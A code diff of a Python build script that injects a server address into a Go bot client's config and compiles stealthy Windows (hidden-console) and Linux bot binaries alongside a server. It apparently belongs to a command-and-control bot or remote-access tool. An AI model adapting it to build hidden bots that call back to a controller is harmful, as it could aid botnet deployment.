@@ -1,5 +1,6 @@
 import json
 import os
+import time
 
 
 def ReadConfig(path: str) -> str:
@@ -14,9 +15,7 @@ def ReadConfig(path: str) -> str:
 
 def Build(config: str):
 
-    os.system("rm -r -f ./temp_bot")
-    os.system("cp -r client ./temp_bot")  # temp bot dir
-    with open("temp_bot/config/config.go") as botconf:
+    with open("client/config/config.go") as botconf:
         conf = botconf.read()
 
     result = ""
@@ -35,9 +34,9 @@ def Build(config: str):
                 result = result.replace(
                     i, f'	PROXYURL = "http://{config["Api"]["Server"]}:{config["Api"]["Port"]}/DewmDCSjihfwj"')
 
-    os.remove("./temp_bot/config/config.go")
+    os.remove("./client/config/config.go")
 
-    with open("./temp_bot/config/config.go", "w") as file:
+    with open("./client/config/config.go", "w") as file:
         file.write(result)
 
     os.system("""
@@ -52,7 +51,7 @@ def Build(config: str):
 	cp win_server.exe ./bin/windows
 	cp linux_server.bin ./bin/linux
 
-    cd ./temp_bot
+    cd client
 	GOOS=linux go build -ldflags "-s -w" -o bot.bin .
 	GOOS=windows go build -ldflags "-H windowsgui -s -w" -o bot.exe .
 
@@ -66,8 +65,6 @@ def Build(config: str):
 	rm ../win_server.exe
 
     """)
-
-    os.system("rm -r -f ./temp_bot")
 
 
 if __name__ == "__main__":
